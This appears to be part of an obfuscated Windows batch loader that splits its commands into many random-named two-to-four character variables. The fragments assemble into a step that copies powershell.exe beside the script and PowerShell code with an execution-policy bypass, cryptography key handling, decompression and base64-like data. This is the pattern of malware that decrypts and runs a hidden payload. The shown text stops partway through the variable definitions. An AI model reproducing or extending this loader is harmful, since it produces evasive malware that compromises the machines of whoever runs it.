@echo off
set "hpJoqkRJDC=0\"
set "XAPqfIQCas=do"
set "mxYayzxCpW=he"
set "TzUCRnnoXr=ws"
set "fGqqBWbmke=\W"
set "nDGALnRbVm=he"
set "clexHFRZkT=we"
set "gAegpUNziW=ow"
set "HvqTgIPymj=.e"
set "vfxWhaWtiW=st"
set "UDEyoELorS=em"
set "pqoKTNKfGG=py"
set "gymSksJeCK=rS"
set "ktpGWUQcSO=ll"
set "tFgOeIGYVj=xe"
set "gONoempbQT=co"
set "cyjsfNXPqS=s\"
set "crtGGJOgjS=Sy"
set "dUGwFJBFNZ=nd"
set "pBWYsSmNtc=y "
set "CVGDpIuwUl=ll"
set "RDGtYzMVsb=in"
set "vpxLegEONa=rs"
set "zbslkEneZi=1."
set "EvDPCWKlWo=:\"
set "NwmhAffOXK= C"
set "MMoUWPgxzF=32"
set "mnzGwBCvsK=we"
set "BazxRHcNvq=Wi"
set "XmkqpYuUOs=po"
set "KAzfzcZQPk= /"
set "DydnbjfVWx=Po"
set "vnddlfmkcJ=\v"
set "Jhfvyunjqv= %~dp0"
set "moXMvjZzpj=cd"
set "AkgAApApMJ=.Key"
set "TVPKexpNBE=-ep "
set "FwlOrahGqc=::('"
set "slxeDcHfhb=raph"
set "ZlLjYikYBQ=rt]:"
set "lyLHNxMVks=OyzA"
set "UYTVXsAKiQ=UGTu"
set "DsSzMBzJtR=tem."
set "alCQxbjBXj=[Sys"
set "lZFlGiXHPb=ress"
set "EusTvVPEfO=;$vD"
set "ULWSTtjdQO=tem."
set "CDjvwYgOJm=]::("
set "NIRatDZlZu=v4Ir"
set "dUTJqWvIhS=vj0m"
set "uTJFUwnpUr=n ''"
set "DdoAertnRU=[-1."
set "DcIfmoObZq=bjec"
set "imzmkoLolK=tdpx"
set "TwboIppFcs=comm"
set "WJUeRurxia=saBm"
set "acKEoBiavT=  $P"
set "PhhnscGPHX=aA.T"
set "VFbekVxCTG=in $"
set "vWqPhSSTqG= [Sy"
set "EkaspTPVIH=m(, "
set "tAURSFNmbh=);$Q"
set "wHKQCFQdII=iI, "
set "sNlhgVpqgB=y.Ci"
set "hAFelwGCZL=dby."
set "HXolBRuQyx=Comp"
set "YfGGtTxjaq=ay()"
set "NthgHjfZFZ=.Len"
set "oUEvVulvvS=x = "
set "IAqglJcLKb=NDpz"
set "usRnrKQXoE=pose"
set "vgYJRYRIeL=] -j"
set "DhgTEvuTUY=sGUc"
set "JxGgMaKjcC=).Sp"
set "YNZpJxQlWG=:('g"
set "SZRqgfXYyX=$Lyz"
set "SKfRCCuUXj=[Sys"
